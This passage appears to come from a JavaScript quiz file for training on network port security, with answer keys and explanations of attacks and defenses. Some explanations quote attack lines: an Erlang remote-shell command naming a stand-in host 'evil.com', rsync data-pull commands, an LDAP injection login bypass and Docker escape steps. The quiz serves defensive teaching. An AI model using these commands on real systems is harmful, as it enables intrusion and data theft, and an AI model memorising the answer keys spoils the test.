            mitre: 'T1486',
            explanation: '🍃 Port 27017 = MongoDB. 2017: 27,000+ MongoDB databases **deleted and held for ransom** (0.2 BTC each). Cause: Pre-MongoDB 3.6, authentication **disabled by default** + bind to 0.0.0.0. Attackers: db.dropDatabase(), leave ransom note. Defense: 1) **Enable authentication** (--auth), 2) **Bind to localhost**, 3) **Firewall rules**, 4) **Enable access control**, 5) **TLS/SSL**, 6) **Backups** (ransomware mitigation). Shodan exposed 47,000+ open MongoDB instances. MITRE: T1486 (Data Encrypted for Impact - Ransomware).'
        },
        {
            id: 'port22',
            title: 'Docker API Exposure',
            points: 3,
            difficulty: 'advanced',
            question: 'Docker API on port 2375 is accessible from the internet. What is the risk?',
            type: 'radio',
            options: [
                { value: 'full_control', text: 'Complete server takeover' },
                { value: 'read_only', text: 'Attackers can only view running containers' },
                { value: 'minor', text: 'Minor risk' },
                { value: 'safe', text: 'Docker API is designed for internet exposure' }
            ],
            correct: 'full_control',
            mitre: 'T1610',
            explanation: '🐳 Port 2375 = Docker API (unencrypted), Port 2376 = Docker API (TLS). Exposed API = **root-level access**: 1) Deploy cryptominers in containers, 2) **Container escape** (mount host filesystem as volume, write to /root/.ssh/authorized_keys), 3) Extract secrets/env vars, 4) Lateral movement. Real-world: TeamTNT cryptojacking group exploits open Docker APIs. Defense: 1) **NEVER expose 2375 to internet**, 2) **Use TLS** (2376 with client certs), 3) **SSH tunnel**, 4) **Network segmentation**. MITRE: T1610 (Deploy Container).'
        },
        {
            id: 'port23',
            title: 'Elasticsearch Data Exposure',
            points: 2,
            difficulty: 'intermediate',
            question: 'Elasticsearch is running on port 9200 without authentication. What data is at risk?',
            type: 'checkbox',
            options: [
                { value: 'indices', text: 'All indexed data' },
                { value: 'delete', text: 'Attackers can delete indices or entire cluster' },
                { value: 'rce', text: 'Potential RCE via Groovy/Painless scripts' },
                { value: 'safe', text: 'Elasticsearch has built-in auth by default' }
            ],
            correct: ['indices', 'delete', 'rce'],
            mitre: 'T1190',
            explanation: '🔍 Port 9200 = Elasticsearch (search/analytics engine). Open Elasticsearch = **catastrophic data breach**. 2020: 11 million+ records exposed (healthcare, financial). Risks: 1) Read all indices (`GET /_search`), 2) Delete data (`DELETE /index`), 3) RCE via scripts (CVE-2014-3120, CVE-2015-1427). Defense: 1) **Enable X-Pack Security** (authentication/authorization), 2) **Bind to localhost**, 3) **Firewall rules**, 4) **Disable dynamic scripting**, 5) **TLS encryption**. Port 9300 = transport protocol (inter-node). MITRE: T1190.'
        },
        {
            id: 'port24',
            title: 'Kubernetes API Server',
            points: 3,
            difficulty: 'advanced',
            question: 'Kubernetes API server on port 6443 is misconfigured to allow anonymous access. What can happen?',
            type: 'radio',
            options: [
                { value: 'cluster_control', text: 'Full cluster compromise' },
                { value: 'read_only', text: 'Read-only access to pod metadata' },
                { value: 'single_pod', text: 'Access to single pod only' },
                { value: 'safe', text: 'Kubernetes has namespace isolation, safe by default' }
            ],
            correct: 'cluster_control',
            mitre: 'T1552.007',
            explanation: '☸️ Port 6443 = Kubernetes API server. Anonymous/unauthenticated access = **cluster takeover**: 1) Deploy malicious pods (cryptominers), 2) **Access secrets** (credentials, tokens, API keys), 3) **Privilege escalation** (create service account with cluster-admin), 4) **Data exfiltration** via sidecars, 5) Lateral movement to nodes. CVE-2018-1002105: unauthorized privilege escalation. Defense: 1) **Disable anonymous auth** (--anonymous-auth=false), 2) **RBAC policies**, 3) **Network policies**, 4) **TLS + client certs**, 5) **Audit logging**. MITRE: T1552.007 (Container API).'
        },
        {
            id: 'port25',
            title: 'TFTP Insecure File Transfer',
            points: 2,
            difficulty: 'beginner',
            question: 'TFTP runs on port 69. Why is it considered insecure?',
            type: 'checkbox',
            options: [
                { value: 'no_auth', text: 'No authentication' },
                { value: 'no_encrypt', text: 'No encryption' },
                { value: 'udp', text: 'Uses UDP' },
                { value: 'modern', text: 'TFTP is the modern secure replacement for FTP' }
            ],
            correct: ['no_auth', 'no_encrypt', 'udp'],
            mitre: 'T1071.002',
            explanation: '📁 Port 69 = TFTP (Trivial File Transfer Protocol). Security flaws: 1) **No authentication** - anyone can GET/PUT files, 2) **No encryption** - cleartext transmission, 3) **UDP-based** - no integrity checks, easy to spoof. Legitimate use: Network device firmware updates (routers, switches boot via TFTP). Attack: Extract router configs with credentials. Defense: 1) **Restrict to isolated management VLAN**, 2) **ACLs** (allow only specific IPs), 3) **Read-only mode**, 4) **Use SCP/SFTP instead**. MITRE: T1071.002 (File Transfer Protocols).'
        },
        {
            id: 'port26',
            title: 'Oracle TNS Listener',
            points: 2,
            difficulty: 'intermediate',
            question: 'Oracle database listener runs on port 1521. What is a common attack?',
            type: 'radio',
            options: [
                { value: 'tns_poison', text: 'TNS poisoning' },
                { value: 'ddos', text: 'DDoS amplification' },
                { value: 'ransomware', text: 'Ransomware encryption' },
                { value: 'safe', text: 'Oracle is immune to network attacks' }
            ],
            correct: 'tns_poison',
            mitre: 'T1557',
            explanation: '🏛️ Port 1521 = Oracle TNS (Transparent Network Substrate) Listener. **TNS Poisoning**: Attacker registers fake database service with listener, intercepts client connections, steals credentials. CVE-2012-1675: Remote exploit. Other risks: Default passwords (scott/tiger), SQL injection, brute force on SYS/SYSTEM accounts. Defense: 1) **VALID_NODE_CHECKING_REGISTRATION** (whitelist), 2) **Strong listener password**, 3) **Firewall rules**, 4) **Encrypt connections** (Oracle Advanced Security), 5) **Disable external procedures**. MITRE: T1557 (Man-in-the-Middle).'
        },
        {
            id: 'port27',
            title: 'Tor SOCKS Proxy Detection',
            points: 2,
            difficulty: 'intermediate',
            question: 'You detect traffic to port 9050 on internal hosts. What does this indicate?',
            type: 'radio',
            options: [
                { value: 'tor', text: 'Tor SOCKS proxy' },
                { value: 'vpn', text: 'Corporate VPN connection' },
                { value: 'proxy', text: 'Standard web proxy' },
                { value: 'safe', text: 'Normal business application' }
            ],
            correct: 'tor',
            mitre: 'T1090.003',
            explanation: '🧅 Port 9050 = Tor SOCKS proxy (localhost). Detection: Host running Tor client for anonymity. Legitimate uses: Privacy, journalism, bypassing censorship. Malicious uses: 1) **C2 over Tor hidden services** (.onion domains), 2) **Data exfiltration** (avoid detection), 3) **Insider threat** (hide malicious activity), 4) **Ransomware** (payment/comms via Tor). Defense: 1) **Block Tor exit node IPs** (public lists), 2) **Monitor for Tor binary** (tor.exe), 3) **DPI** (detect Tor handshake), 4) **Policy enforcement**. MITRE: T1090.003 (Multi-hop Proxy - Tor).'
        },
        {
            id: 'port28',
            title: 'WinRM Remote Management',
            points: 2,
            difficulty: 'intermediate',
            question: 'Windows Remote Management uses ports 5985 and 5986. What is the difference?',
            type: 'radio',
            options: [
                { value: 'http_https', text: 'Port 5985 = HTTP, Port 5986 = HTTPS' },
                { value: 'version', text: 'Port 5985 = WinRM v1, Port 5986 = WinRM v2' },
                { value: 'function', text: 'Port 5985 = PowerShell, Port 5986 = CMD' },
                { value: 'protocol', text: 'Port 5985 = TCP, Port 5986 = UDP' }
            ],
            correct: 'http_https',
            mitre: 'T1021.006',
            explanation: '🪟 WinRM Ports: **5985** = HTTP (unencrypted but Kerberos-encrypted payload in domain), **5986** = HTTPS (TLS encrypted). WinRM enables remote PowerShell (Enter-PSSession). Attackers use for lateral movement with valid credentials (pass-the-hash works). Defense: 1) **Use 5986 for internet-facing**, 2) **Restrict to admin VLAN**, 3) **Strong passwords/MFA**, 4) **Monitor WinRM logs** (Event ID 91, 142), 5) **Disable if unused**. Tools: evil-winrm, CrackMapExec. MITRE: T1021.006 (Windows Remote Management).'
        },
        {
            id: 'port29',
            title: 'SIP VoIP Security',
            points: 2,
            difficulty: 'intermediate',
            question: 'SIP (VoIP) uses ports 5060 and 5061. What attacks target these services?',
            type: 'checkbox',
            options: [
                { value: 'toll_fraud', text: 'Toll fraud' },
                { value: 'eavesdrop', text: 'Call eavesdropping via unencrypted RTP streams' },
                { value: 'vishing', text: 'Caller ID spoofing for vishing attacks' },
                { value: 'safe', text: 'SIP is encrypted by default' }
            ],
            correct: ['toll_fraud', 'eavesdrop', 'vishing'],
            mitre: 'T1071.001',
            explanation: '📞 SIP Ports: **5060** = SIP (Session Initiation Protocol) unencrypted, **5061** = SIP over TLS. Attacks: 1) **Toll fraud** - weak PBX passwords, attackers make calls ($100K+ bills), 2) **Eavesdropping** - SIP + RTP unencrypted (Wireshark captures calls), 3) **Caller ID spoofing**, 4) **DoS** (SIP INVITE flood), 5) **Registration hijacking**. Defense: 1) **Strong PBX passwords**, 2) **Use SIPS (5061) + SRTP** (encrypted), 3) **Firewall rules**, 4) **Fail2Ban for brute force**, 5) **SBC (Session Border Controller)**. MITRE: T1071.001.'
        },
        {
            id: 'port30',
            title: 'X11 Forwarding Risk',
            points: 3,
            difficulty: 'advanced',
            question: 'X11 display server runs on port 6000. What security issue does X11 forwarding present?',
            type: 'radio',
            options: [
                { value: 'keylog', text: 'Keylogging and screen capture' },
                { value: 'slow', text: 'Excessive bandwidth usage' },
                { value: 'compatibility', text: 'Compatibility issues with modern apps' },
                { value: 'safe', text: 'X11 has perfect isolation between clients' }
            ],
            correct: 'keylog',
            mitre: 'T1056.001',
            explanation: '🖥️ Port 6000 = X11 display server (6001, 6002 for additional displays). Security flaw: **No isolation between X clients** - malicious app can: 1) Capture keystrokes from all windows, 2) Take screenshots, 3) Inject keyboard/mouse events, 4) Read window contents. SSH X11 forwarding (ssh -X) creates tunnel but client is still untrusted. Defense: 1) **Use Wayland** (modern replacement with better isolation), 2) **ssh -Y** (trusted forwarding only when needed), 3) **xhost -** (disable network X), 4) **Firewall block 6000-6010**. MITRE: T1056.001 (Keylogging).'
        },
        {
            id: 'port31',
            title: 'MQTT IoT Protocol',
            points: 2,
            difficulty: 'intermediate',
            question: 'MQTT (IoT messaging) uses ports 1883 and 8883. What is the security difference?',
            type: 'radio',
            options: [
                { value: 'tls', text: 'Port 1883 = unencrypted, Port 8883 = TLS encrypted' },
                { value: 'version', text: 'Port 1883 = MQTT v3, Port 8883 = MQTT v5' },
                { value: 'function', text: 'Port 1883 = publish, Port 8883 = subscribe' },
                { value: 'bandwidth', text: 'Port 8883 uses compression' }
            ],
            correct: 'tls',
            mitre: 'T1071.001',
            explanation: '📡 MQTT Ports: **1883** = unencrypted MQTT, **8883** = MQTT over TLS. Used by IoT devices (smart home, industrial sensors). Security issues: 1) **No auth by default** - anyone can publish/subscribe, 2) **Unencrypted** - credentials/data visible, 3) **Topic enumeration** - discover sensitive topics. Shodan: 100K+ open MQTT brokers. Attacks: Control smart devices, exfiltrate sensor data, DoS. Defense: 1) **Enable authentication**, 2) **Use port 8883 with TLS**, 3) **ACLs per topic**, 4) **Network segmentation (IoT VLAN)**. MITRE: T1071.001 (Application Layer Protocol).'
        },
        {
            id: 'port32',
            title: 'Apache JServ Protocol',
            points: 3,
            difficulty: 'advanced',
            question: 'AJP (Apache JServ Protocol) on port 8009 is exposed. What critical vulnerability exists?',
            type: 'radio',
            options: [
                { value: 'ghostcat', text: 'Ghostcat' },
                { value: 'ddos', text: 'DDoS amplification' },
                { value: 'xss', text: 'Cross-site scripting' },
                { value: 'safe', text: 'AJP is designed for internet exposure' }
            ],
            correct: 'ghostcat',
            mitre: 'T1190',
            explanation: '🐱 Port 8009 = AJP (Apache JServ Protocol) - connects Apache to Tomcat. **Ghostcat (CVE-2020-1938)**: AJP connector accepts arbitrary file read requests → attacker reads `WEB-INF/web.xml` (credentials, DB configs) → RCE via file upload + inclusion. Affected Tomcat 6-9 (billions of servers). Defense: 1) **Upgrade Tomcat** (9.0.31+, 8.5.51+, 7.0.100+), 2) **Bind AJP to localhost** (address="127.0.0.1"), 3) **Require secret** (secretRequired="true"), 4) **Firewall rules**. MITRE: T1190 (Exploit Public-Facing Application).'
        },
        {
            id: 'port33',
            title: 'Rsync Data Synchronization',
            points: 2,
            difficulty: 'intermediate',
            question: 'Rsync service on port 873 has no authentication. What is at risk?',
            type: 'checkbox',
            options: [
                { value: 'download', text: 'Attackers can download all shared files/directories' },
                { value: 'upload', text: 'Attackers can upload malicious files' },
                { value: 'overwrite', text: 'Overwrite critical system files' },
                { value: 'safe', text: 'Rsync is read-only by default' }
            ],
            correct: ['download', 'upload', 'overwrite'],
            mitre: 'T1020',
            explanation: '🔄 Port 873 = Rsync (efficient file sync). Unauthenticated rsync = data breach: `rsync rsync://target.com/` lists modules, `rsync -avz rsync://target.com/module .` downloads everything. If writable: upload webshells, backdoors, modify configs. Real-world: Source code leaks, database dumps exposed. Defense: 1) **auth users + secrets file** (require password), 2) **read only = true** (unless write needed), 3) **hosts allow/deny**, 4) **Use over SSH** (rsync -e ssh), 5) **Never expose 873 to internet**. MITRE: T1020 (Automated Exfiltration).'
        },
        {
            id: 'port34',
            title: 'Hadoop WebHDFS Interface',
            points: 3,
            difficulty: 'advanced',
            question: 'Hadoop NameNode web interface runs on port 50070. What data is exposed?',
            type: 'checkbox',
            options: [
                { value: 'filesystem', text: 'Complete HDFS filesystem browsing' },
                { value: 'cluster', text: 'Cluster topology and configuration details' },
                { value: 'logs', text: 'Application logs with potential credentials' },
                { value: 'safe', text: 'Web UI is read-only and safe' }
            ],
            correct: ['filesystem', 'cluster', 'logs'],
            mitre: 'T1190',
            explanation: '🐘 Port 50070 = Hadoop NameNode WebUI (v2: 9870). Open access = **massive data breach**: 1) Browse entire HDFS (`/explorer.html`), 2) Download files via WebHDFS API, 3) View cluster configs (node IPs, versions), 4) Access logs. 2016-2019: Dozens of companies exposed petabytes (financial data, customer PII). Defense: 1) **Kerberos authentication**, 2) **Firewall rules** (internal only), 3) **Reverse proxy with auth**, 4) **Encryption** (at-rest + in-transit), 5) **Network segmentation**. Ports: 50070 (NN), 50075 (DN), 50090 (Secondary NN). MITRE: T1190.'
        },
        {
            id: 'port35',
            title: 'Printer Port Security',
            points: 2,
            difficulty: 'beginner',
            question: 'Network printers commonly use ports 9100, 515, and 631. What are the security concerns?',
            type: 'checkbox',
            options: [
                { value: 'no_auth', text: 'No authentication' },
                { value: 'info_leak', text: 'Printed documents may contain sensitive data' },
                { value: 'pivot', text: 'Printers can be pivot points for network attacks' },
                { value: 'safe', text: 'Printers are isolated devices with no risk' }
            ],
            correct: ['no_auth', 'info_leak', 'pivot'],
            mitre: 'T1074',
            explanation: '🖨️ Printer Ports: **9100** = RAW/JetDirect, **515** = LPD (Line Printer Daemon), **631** = IPP (Internet Printing Protocol). Risks: 1) **No auth** - attackers print, retrieve print jobs (PII, financials), 2) **Firmwares exploitable** (RCE, persistent implants), 3) **Network pivot** - printers rarely monitored, 4) **Data at rest** - HDDs retain print jobs. Attacks: Print bomb (physical DoS), extract documents, inject malicious PS/PCL. Defense: 1) **Segment printer VLAN**, 2) **Enable auth (IPP)**, 3) **Update firmware**, 4) **Clear HDD on decommission**. MITRE: T1074 (Data Staged).'
        },
        {
            id: 'port36',
            title: 'Splunk Management Port',
            points: 2,
            difficulty: 'intermediate',
            question: 'Splunk management interface runs on port 8089. What can attackers do with unauthorized access?',
            type: 'checkbox',
            options: [
                { value: 'search', text: 'Search all indexed logs' },
                { value: 'rce', text: 'Remote code execution via scripted inputs or custom apps' },
                { value: 'config', text: 'Modify configurations, disable alerts, cover tracks' },
                { value: 'readonly', text: 'Port 8089 provides read-only access' }
            ],
            correct: ['search', 'rce', 'config'],
            mitre: 'T1562.001',
            explanation: '📊 Port 8089 = Splunk Management (REST API), Port 8000 = Web UI. Compromised Splunk = **catastrophic**: 1) **Access all logs** (credentials, incidents, investigations), 2) **RCE** - deploy malicious apps (.tar.gz with Python scripts), scripted inputs execute commands, 3) **Tamper** - delete logs, disable alerts, create backdoor users. Real attacks: APT groups target SIEMs first. Defense: 1) **Strong admin password**, 2) **TLS + client certs**, 3) **RBAC** (limit search permissions), 4) **Network ACLs**, 5) **Monitor Splunk audit logs**. MITRE: T1562.001 (Disable Security Tools).'
        },
        {
            id: 'port37',
            title: 'Zookeeper Coordination Service',
            points: 3,
            difficulty: 'advanced',
            question: 'Apache Zookeeper on port 2181 has no authentication. What is the impact?',
            type: 'radio',
            options: [
                { value: 'cluster_control', text: 'Complete cluster disruption' },
                { value: 'read_only', text: 'Read-only access to metadata' },
                { value: 'minor', text: 'Minor impact, easily recoverable' },
                { value: 'safe', text: 'Zookeeper isolation prevents damage' }
            ],
            correct: 'cluster_control',
            mitre: 'T1485',
            explanation: '🦓 Port 2181 = Apache Zookeeper (distributed coordination for Kafka, HBase, Hadoop). Unauthenticated Zookeeper = **cluster-wide catastrophe**: 1) Read all znodes (configs, secrets, state), 2) **Delete znodes** → crash entire distributed system, 3) **Modify configs** → inject malicious broker addresses, 4) **DoS** - exhaust connections. Real attack: Competitors sabotage production clusters. Defense: 1) **Enable SASL authentication**, 2) **ACLs on znodes**, 3) **Firewall rules** (internal only), 4) **TLS encryption**, 5) **Monitor 4lw commands** (stat, conf). MITRE: T1485 (Data Destruction).'
        },
        {
            id: 'port38',
            title: 'mDNS Service Discovery',
            points: 2,
            difficulty: 'intermediate',
            question: 'mDNS (Multicast DNS) operates on port 5353. What privacy concern does it present?',
            type: 'radio',
            options: [
                { value: 'enumeration', text: 'Network enumeration' },
                { value: 'amplification', text: 'DDoS amplification attacks' },
                { value: 'mitm', text: 'Man-in-the-middle attacks' },
                { value: 'safe', text: 'mDNS is enterprise-grade secure' }
            ],
            correct: 'enumeration',
            mitre: 'T1046',
            explanation: '📡 Port 5353 = mDNS (Multicast DNS) - Bonjour/Avahi. Used for zero-config networking (.local domains). Security issue: **Broadcasting device info**: hostnames (Johns-MacBook-Pro.local), services (printers, file shares, SSH), OS fingerprinting. Privacy leak: Tracks users across networks via unique .local name. Attacks: 1) **Reconnaissance** - map entire network passively, 2) **Targeted phishing** (know device names/users), 3) **Service exploitation**. Defense: 1) **Disable if unused**, 2) **Firewall block 5353 at perimeter**, 3) **mDNS gateway** for controlled exposure. MITRE: T1046 (Network Service Scanning).'
        },
        {
            id: 'port39',
            title: 'SAP Router Protocol',
            points: 3,
            difficulty: 'advanced',
            question: 'SAP Router on port 3299 is misconfigured. What can attackers access?',
            type: 'radio',
            options: [
                { value: 'sap_systems', text: 'Direct access to internal SAP systems and databases' },
                { value: 'web_only', text: 'Only web portal access' },
                { value: 'logs', text: 'Read-only log access' },
                { value: 'safe', text: 'SAP Router blocks all unauthorized access' }
            ],
            correct: 'sap_systems',
            mitre: 'T1190',
            explanation: '🏢 Port 3299 = SAP Router (access control for SAP landscapes). Misconfigured route permissions = **bypass all SAP security**: 1) Connect to internal SAP systems (ERP, CRM, SCM), 2) Exploit vulnerabilities (CVE-2020-6207 LT Recon), 3) **Extract data** (customer records, financial data, HR info), 4) **Modify transactions**. SAProuter permission table: "P *" = allow all (catastrophic). Defense: 1) **Strict route permissions** (whitelist IPs/hosts), 2) **SNC encryption**, 3) **Logging + monitoring**, 4) **Patch regularly**, 5) **No internet exposure**. MITRE: T1190 (Exploit Public-Facing Application).'
        },
        {
            id: 'port40',
            title: 'Port Knocking Technique',
            points: 3,
            difficulty: 'advanced',
            question: 'What is port knocking and how does it enhance security?',
            type: 'radio',
            options: [
                { value: 'sequence', text: 'Hidden services' },
                { value: 'encryption', text: 'Advanced encryption protocol for all ports' },
                { value: 'ddos', text: 'DDoS mitigation technique' },
                { value: 'scanning', text: 'Automated port scanning tool' }
            ],
            correct: 'sequence',
            mitre: 'T1205.001',
            explanation: '🚪 Port Knocking: Client sends packets to specific closed ports in sequence (e.g., 1234→5678→9012) → firewall detects pattern → temporarily opens real service port (SSH 22). Benefits: 1) **Service appears closed** to scanners, 2) **Reduce attack surface**, 3) **Prevents brute force** (attackers can\'t find service). Drawbacks: 1) **Security through obscurity** (not true security), 2) **Packet sniffers reveal sequence**, 3) **Complexity**. Modern alternative: **Single Packet Authorization (SPA)** - encrypted/signed packet. Defense: Use as additional layer, not primary security. Tools: knockd. MITRE: T1205.001 (Port Knocking - though usually defensive).'
        },
        {
            id: 'port41',
            title: 'RabbitMQ Message Queue',
            points: 2,
            difficulty: 'intermediate',
            question: 'RabbitMQ management interface on port 15672 uses default credentials. What is the risk?',
            type: 'checkbox',
            options: [
                { value: 'queues', text: 'Access to all message queues' },
                { value: 'inject', text: 'Inject malicious messages to trigger application vulnerabilities' },
                { value: 'config', text: 'Modify queue configurations, create backdoor users' },
                { value: 'safe', text: 'Default credentials are automatically changed on first boot' }
            ],
            correct: ['queues', 'inject', 'config'],
            mitre: 'T1078',
            explanation: '🐰 RabbitMQ Ports: **5672** = AMQP protocol, **15672** = Management UI. Default: guest/guest (pre-3.3.0 allowed remotely). Compromise impact: 1) **Read messages** (credentials, PII, business logic), 2) **Inject messages** → trigger SQL injection, XSS, RCE in consumers, 3) **Create admin users** → persistence, 4) **DoS** - delete queues, exhaust memory. Defense: 1) **Change default password**, 2) **Disable guest user remotely**, 3) **TLS encryption**, 4) **Firewall rules**, 5) **RBAC** (virtual hosts, permissions). MITRE: T1078 (Valid Accounts - Default).'
        },
        {
            id: 'port42',
            title: 'Jenkins CI/CD Exposure',
            points: 3,
            difficulty: 'advanced',
            question: 'Jenkins automation server on port 8080 has no authentication. What can attackers do?',
            type: 'checkbox',
            options: [
                { value: 'rce', text: 'Remote code execution via script console' },
                { value: 'credentials', text: 'Extract stored credentials' },
                { value: 'supply_chain', text: 'Inject backdoors into build pipeline' },
                { value: 'readonly', text: 'Jenkins guest mode is read-only' }
            ],
            correct: ['rce', 'credentials', 'supply_chain'],
            mitre: 'T1505.003',
            explanation: '⚙️ Port 8080 = Jenkins (CI/CD). Unauthenticated Jenkins = **complete compromise + supply chain attack**: 1) **RCE** - Script Console executes arbitrary Groovy code as Jenkins user (often root/SYSTEM), 2) **Credential dump** - extract all secrets (API keys, cloud creds), 3) **Pipeline poisoning** - inject malicious code into builds → backdoor all releases, 4) **Lateral movement** - Jenkins has access to prod servers. Real attacks: Cryptominers, ransomware. Defense: 1) **Enable authentication**, 2) **RBAC**, 3) **Never expose to internet**, 4) **Credential encryption**, 5) **Audit logs**. MITRE: T1505.003 (Web Shell - though broader).'
        },
        {
            id: 'port43',
            title: 'Citrix Gateway Protocols',
            points: 2,
            difficulty: 'intermediate',
            question: 'Citrix uses ports 1494 and 2598. What critical vulnerability class affects these?',
            type: 'radio',
            options: [
                { value: 'rce', text: 'Remote code execution (CVE-2019-19781 "Shitrix"' },
                { value: 'encryption', text: 'Weak encryption protocols' },
                { value: 'ddos', text: 'DDoS amplification' },
                { value: 'safe', text: 'Citrix has no major vulnerabilities' }
            ],
            correct: 'rce',
            mitre: 'T1190',
            explanation: '🖥️ Citrix Ports: **1494** = ICA (Independent Computing Architecture), **2598** = Session Reliability, **443** = Gateway. **CVE-2019-19781 "Shitrix"**: Path traversal in Citrix ADC/Gateway → unauthenticated RCE → 80,000+ servers compromised (2020). Attackers: Ransomware groups (Ragnar Locker), APTs, cryptominers. Other CVEs: CVE-2020-8193, CVE-2020-8195. Defense: 1) **Patch immediately** (critical infrastructure target), 2) **WAF rules**, 3) **Network segmentation**, 4) **MFA**, 5) **Monitor for indicators** (webshells in /netscaler/portal/). MITRE: T1190 (Exploit Public-Facing Application).'
        },
        {
            id: 'port44',
            title: 'High Ephemeral Ports',
            points: 2,
            difficulty: 'intermediate',
            question: 'You notice outbound connections to random ports in range 49152-65535. What are these?',
            type: 'radio',
            options: [
                { value: 'ephemeral', text: 'Ephemeral ports' },
                { value: 'malware', text: 'Always indicates malware C2' },
                { value: 'exploit', text: 'Exploitation attempts' },
                { value: 'error', text: 'Firewall misconfiguration error' }
            ],
            correct: 'ephemeral',
            mitre: 'T1071',
            explanation: '🔢 Ephemeral Ports (49152-65535): Operating systems assign random ports from this range for **outbound connections** (client-side). Example: Browse website → your PC uses 192.168.1.5:53281 → server:443. This is **normal behavior**. However: Malware also uses these ports for C2 to blend in. Detection: 1) **Focus on destination** (suspicious IPs/domains), 2) **Connection frequency** (beaconing), 3) **Process analysis** (unknown .exe → ephemeral port), 4) **Data volume anomalies**. Not suspicious alone, requires context. MITRE: T1071 (Application Layer Protocol - when used for C2).'
        },
        {
            id: 'port45',
            title: 'Erlang Port Mapper Daemon',
            points: 3,
            difficulty: 'advanced',
            question: 'Erlang EPMD runs on port 4369. Why is this concerning for RabbitMQ/CouchDB deployments?',
            type: 'radio',
            options: [
                { value: 'rce', text: 'Enables RCE' },
                { value: 'read_only', text: 'Provides read-only cluster status' },
                { value: 'logging', text: 'Only used for logging' },
                { value: 'safe', text: 'EPMD has authentication by default' }
            ],
            correct: 'rce',
            mitre: 'T1210',
            explanation: '🔴 Port 4369 = Erlang Port Mapper Daemon (EPMD) - used by RabbitMQ, CouchDB, Riak, ejabberd. **No authentication**: EPMD reports which ports Erlang nodes listen on (usually random high ports) → attacker connects to distribution port → **full code execution** (Erlang shell access = cluster compromise). Attack: `erl -name attacker@evil.com -setcookie <cookie> -remsh target@victim.com`. Defense: 1) **Firewall block 4369 + distribution ports**, 2) **Strong Erlang cookie** (shared secret), 3) **TLS for distribution**, 4) **Network segmentation**. MITRE: T1210 (Exploitation of Remote Services).'
        },
        {
            id: 'port46',
            title: 'RTSP Camera Streams',
            points: 2,
            difficulty: 'intermediate',
            question: 'RTSP (Real-Time Streaming Protocol) on port 554 often has weak security. What are common issues?',
            type: 'checkbox',
            options: [
                { value: 'default', text: 'Default credentials' },
                { value: 'no_auth', text: 'No authentication' },
                { value: 'unencrypted', text: 'Unencrypted streams' },
                { value: 'safe', text: 'Modern cameras require strong passwords by default' }
            ],
            correct: ['default', 'no_auth', 'unencrypted'],
            mitre: 'T1078',
            explanation: '📹 Port 554 = RTSP (IP cameras, security cameras, streaming). **Massive security failures**: 1) **Default passwords** - admin/admin, root/12345, admin/\'\' (empty), 2) **No auth** - cameras stream publicly (Shodan: 100K+ open cameras), 3) **Base64 creds** - RTSP sends username:password in Base64 (trivial decode). Real impact: Surveillance of homes, businesses, hospitals, government. Mirai botnet exploited cameras for DDoS. Defense: 1) **Change default passwords**, 2) **Enable auth**, 3) **VPN/VLANs**, 4) **Firmware updates**, 5) **Disable UPnP**. MITRE: T1078 (Valid Accounts - Default).'
        },
        {
            id: 'port47',
            title: 'LDAP Injection Attack',
            points: 3,
            difficulty: 'advanced',
            question: 'An application queries LDAP on port 389 with unsanitized input. What attack is possible?',
            type: 'radio',
            options: [
                { value: 'injection', text: 'LDAP injection' },
                { value: 'ddos', text: 'DDoS against LDAP server' },
                { value: 'encryption', text: 'Break LDAP encryption' },
                { value: 'safe', text: 'LDAP queries are inherently safe' }
            ],
            correct: 'injection',
            mitre: 'T1078',
            explanation: '💉 LDAP Injection: Like SQL injection but for LDAP queries. Example: Login form uses `(&(uid=$username)(password=$password))`. Attacker enters username: `admin)(&` password: `anything` → query becomes `(&(uid=admin)(&)(password=anything))` → bypasses password check! Impacts: 1) **Auth bypass**, 2) **User enumeration** (`*` wildcard), 3) **Extract data** (all attributes), 4) **Privilege escalation**. Defense: 1) **Input validation** (whitelist allowed chars), 2) **Escape special chars** (*()\\&|), 3) **Parameterized queries**, 4) **Least privilege** (app shouldn\'t bind as admin). MITRE: T1078.002 (Domain Accounts).'
        },
        {
            id: 'port48',
            title: 'Proxy Server Security',
            points: 2,
            difficulty: 'intermediate',
            question: 'Open proxy servers on ports 3128, 8080, and 1080 are being abused. What are attackers using them for?',
            type: 'checkbox',
            options: [
                { value: 'anonymize', text: 'Anonymize attacks' },
                { value: 'bypass', text: 'Bypass geographic restrictions and blocklists' },
                { value: 'spam', text: 'Send spam and phishing emails through your IP' },
                { value: 'safe', text: 'Open proxies cannot be abused if read-only' }
            ],
            correct: ['anonymize', 'bypass', 'spam'],
            mitre: 'T1090',
            explanation: '🔀 Proxy Ports: **3128** = Squid proxy (HTTP), **8080** = HTTP proxy, **1080** = SOCKS proxy. Open proxy = **free anonymity service for attackers**: 1) **Hide source** - attacks appear from your IP (you get blamed), 2) **Bypass blocks** - access geofenced content, evade IP blacklists, 3) **Spam relay** - send phishing emails through your mail server, 4) **C2 relay** - bounce malware traffic. Your server blacklisted, legal liability. Defense: 1) **Require authentication**, 2) **ACLs** (whitelist allowed clients), 3) **Close to internet**, 4) **Monitor for abuse**, 5) **Rate limiting**. MITRE: T1090 (Proxy).'
        },
        {
            id: 'port49',
            title: 'SCADA/ICS Protocol Security',
            points: 3,
            difficulty: 'advanced',
            question: 'Industrial control systems use Modbus (port 502) and DNP3 (port 20000). What is the main security flaw?',
            type: 'radio',
            options: [
                { value: 'no_auth', text: 'No authentication or encryption' },
                { value: 'weak_encrypt', text: 'Weak encryption' },
                { value: 'slow', text: 'Too slow for modern networks' },
                { value: 'safe', text: 'Air-gapped systems are inherently secure' }
            ],
            correct: 'no_auth',
            mitre: 'T1584',
            explanation: '🏭 SCADA/ICS Ports: **502** = Modbus TCP, **20000** = DNP3, **102** = S7 (Siemens), **44818** = EtherNet/IP. **Critical flaw**: Designed for air-gapped networks (1970s-1990s) with **ZERO security** - no authentication, no encryption, no logging. Stuxnet (2010) proved air-gap myth. Attack: Send Modbus command to PLC → opens valve/stops pump → physical damage (Triton malware at Saudi Aramco). Defense: 1) **Network segmentation** (Purdue model), 2) **Industrial DMZ**, 3) **Unidirectional gateways**, 4) **Anomaly detection** (ICS-IDS), 5) **Never internet-facing**. MITRE: T1584 (Compromise Infrastructure).'
        },
        {
            id: 'port50',
            title: 'Comprehensive Port Security Strategy',
            points: 3,
            difficulty: 'advanced',
            question: 'What is the most effective defense-in-depth approach for port security?',
            type: 'checkbox',
            options: [
                { value: 'principle', text: 'Principle of least privilege' },
                { value: 'segmentation', text: 'Network segmentation' },
                { value: 'monitoring', text: 'Continuous monitoring' },
                { value: 'obscurity', text: 'Security through obscurity' }
            ],
            correct: ['principle', 'segmentation', 'monitoring'],
